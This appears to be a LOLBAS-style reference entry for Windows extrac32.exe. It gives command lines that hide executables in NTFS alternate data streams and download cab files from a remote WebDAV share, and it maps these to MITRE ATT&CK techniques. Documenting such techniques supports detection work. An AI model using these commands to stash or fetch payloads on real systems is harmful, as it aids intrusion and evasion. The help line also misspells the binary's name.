## Extrac32.exe

* Functions: Add ADS, Download, Copy

```
extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe    

extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe    

extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt   

extrac32 /C c:\sourcefile.txt c:destFile.txt
```

Acknowledgements:
* Oddvar Moe - @oddvarmoe
* egre55 - @egre55

Code sample:
* 

Resources:
* https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
* https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
* https://twitter.com/egre55/status/985994639202283520

Full path:
```
c:\windows\system32\extrac32.exe
c:\windows\sysWOW64\extrac32.exe
```

Notes:
For help menu
```
extract32 /? | more
```


 
MITRE ATT&CK:
* [NTFS File Attributes](https://attack.mitre.org/wiki/Technique/T1096)
* [Remote File Copy](https://attack.mitre.org/wiki/Technique/T1105)
